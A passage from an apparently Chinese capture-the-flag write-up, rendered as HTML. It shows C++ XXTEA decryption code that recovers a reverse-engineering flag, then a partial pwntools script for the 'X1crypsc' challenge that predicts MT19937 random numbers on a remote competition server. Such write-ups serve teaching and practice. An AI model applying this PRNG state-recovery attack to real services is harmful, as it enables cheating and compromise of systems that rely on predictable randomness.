punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> p<span class=\"token punctuation\">,</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        sum <span class=\"token operator\">+=</span> DELTA<span class=\"token punctuation\">;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX2<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p>\n<p><img src=\"/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DELTA</span> <span class=\"token expression\"><span class=\"token number\">0x9e3779b9</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MX2</span> <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>z <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">5</span> <span class=\"token operator\">^</span> y <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span> <span class=\"token operator\">^</span> z <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>sum <span class=\"token operator\">^</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> e<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x6e637466</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62ef0ed</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0xa78c0b4f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32303234</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">uint32_t</span> key2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0x32303234</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd6eb12c3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9f1cf72e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e435446</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_decrypt1</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> DELTA <span class=\"token operator\">*</span> rounds<span class=\"token punctuation\">;</span>\n    y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            \n        <span class=\"token punctuation\">&#125;</span>\n        sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">xxtea_decrypt2</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> v<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> y<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> sum<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> rounds<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">;</span>\n    rounds <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span>\n    sum <span class=\"token operator\">=</span> DELTA <span class=\"token operator\">*</span> rounds<span class=\"token punctuation\">;</span>\n    y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n        e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n            v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX2<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n        sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> enc2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">xxtea_decrypt1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>enc1<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">xxtea_decrypt2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>enc2<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.20s%.20s\\n\"</span><span class=\"token punctuation\">,</span> enc1<span class=\"token punctuation\">,</span>enc2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n\n\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"X1crypsc\"><a href=\"#X1crypsc\" class=\"headerlink\" title=\"X1crypsc\"></a><font style=\"color:#000000;\">X1crypsc</font></h3><p>题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> Random\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token comment\">#  Phase 1: 收集PRNG输出数据</span>\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">collect_bits</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Collecting 624*32 bits for MT19937 state...\"</span><span class=\"token punctuation\">)</span>\n    \n    bits_collected <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    D<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> bits_collected <span class=\"token operator\">&lt;</span> <span class=\"token number\">625</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span>  \n        p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'option:'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'W'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 选择武器刷新</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Current attack value: '</span><span class=\"token punctuation\">)</span>\n        line <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        low<span class=\"token punctuation\">,</span> high <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' ~ '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        base <span class=\"token operator\">=</span> low\n        add <span class=\"token operator\">=</span> high <span class=\"token operator\">-</span> base \n        \n        val1 <span class=\"token operator\">=</span> base\n        val2 <span class=\"token operator\">=</span> add\n\n        D<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>val1<span class=\"token punctuation\">)</span>\n        D<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>val2<span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'y'</span><span class=\"token punctuation\">)</span>\n        bits_collected <span class=\"token operator\">+=</span> <span class=\"token number\">32</span>\n        \n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\rBits collected: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>bits_collected<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/20000\"</span></span><span class=\"token punctuation\">)</span>\n        sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token comment\"># 发送'n'不继续刷新</span>\n        p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'n'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> D\n\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token comment\">#  Phase 2: 预测坐标并攻击</span>\n<span class=\"token comment\"># ==========================</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack_monster</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> predictor<span class=\"token punctuation\">,</span>D<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+]'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 预测下一个randrange(2025) x和y</span>\n        x <span class=\"token operator\">=</span> predictor<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span>\n        y <span class=\"token operator\">=</span> predictor<span class=\"token punctuation\">.</span>randrange<span class=\"token punctuation\">(</span><span class=\"token number\">2025</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># 发送攻击指令</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'option:'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'aim:'</span><span class=\"token punctuation\">)</span>\n        p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>x<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>y<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        \n        resp <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        \n        a<span class=\"token operator\">=</span>predictor<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>D<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Victory'</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n    \n\n<span class=\"token comment\">#--------------------------------------------------------------</span>\n\ncontext<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span><span class=\"token punctuation\">)</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'39.106.16.204'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11448</span><span class=\"token punctuation\">)</span> \n\nDall <span class=\"token operator\">=</span> collect_bits<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\n\nn<span class=\"token 